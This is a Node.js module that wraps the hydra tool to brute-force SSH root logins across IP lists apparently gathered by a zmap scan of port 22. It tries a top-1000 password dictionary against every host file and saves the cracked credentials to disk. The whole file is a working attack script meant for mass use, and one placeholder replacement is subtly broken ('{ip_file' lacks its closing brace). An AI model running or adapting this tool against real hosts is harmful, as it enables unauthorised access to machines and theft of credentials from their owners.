const fs = require("fs");
const util = require('util');
const exec = util.promisify(require('child_process').exec);

const Base = require("./base");

class SSH extends Base{
	/*
		*	arg1：结果输出文件
		*	arg2：zmap扫描ip的范围
	*/
	constructor(ip_range_file){
		super(ip_range_file,22);

		this.ip_range_file = ip_range_file;
		//this.out_file = out_file;//__dirname + "/../runtime/user-pass.txt"

		this.brute_command = `hydra -o {out_file} -l root -P ${__dirname}/../dict/top1000.txt -M {ip_file} ssh`;
	}

	run(){

	}

	async bruteIpFromFiles(){
		let all_ips = new Array();
		let base_path = __dirname + "/../runtime/available-ip/";
		let files = fs.readdirSync(base_path);
		let out_base_path = __dirname + "/../runtime/user-pass/"

		for(let file of files){
			let out_file_name = `user_pass_${file}`
			let cmd = this.brute_command.replace("{out_file}",`${out_base_path}${out_file_name}`).replace("{ip_file",`${base_path}${file}`);
			await exec(cmd);
			this.log.info("run cmd " + cmd);
			// let ips = fs.readFileSync(base_path + file);
			// let ip_array = ips.toString().split("\n");
			// all_ips = all_ips.concat(ip_array);
		}
		// let ip_set = new Set(all_ips);
		// for(let ip of ip_set){
		// 	fs.writeFileSync(__dirname + `/../runtime/ip_${this.port}.txt`,ip + "\n",{flag:"a"});
		// }
		// this.log.info("获取ip列表完成");
		return true;
	}

	// async bruteIp(){
	// 	await exec(this.brute_command);
	// }



}

module.exports = SSH;

